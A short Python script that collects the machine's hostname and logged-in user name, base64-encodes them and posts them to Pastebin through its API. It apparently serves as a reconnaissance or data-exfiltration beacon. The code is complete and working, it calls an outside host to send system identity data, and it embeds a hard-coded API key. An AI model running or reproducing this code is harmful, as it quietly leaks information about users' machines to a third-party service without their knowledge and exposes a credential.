import base64, requests, os

def run():
    check = ''
    check= check+os.popen('hostname').read()+os.getlogin()
    print("Hostname : " + os.popen('hostname').read())
    print("User : "+os.getlogin())
    
    url = "https://pastebin.com/api/api_post.php"
    desc = {'api_dev_key':'bVhIXhiaJaDThm3Alx9lzKaZqR_7E31k',
            'api_paste_code':base64.b64encode(bytes(check, 'utf-8')),
            'api_paste_name':'encode',
            'api_option':'paste'
            }
    print(requests.post(url=url, data=desc).text)
    
if __name__ == '__main__':
    run()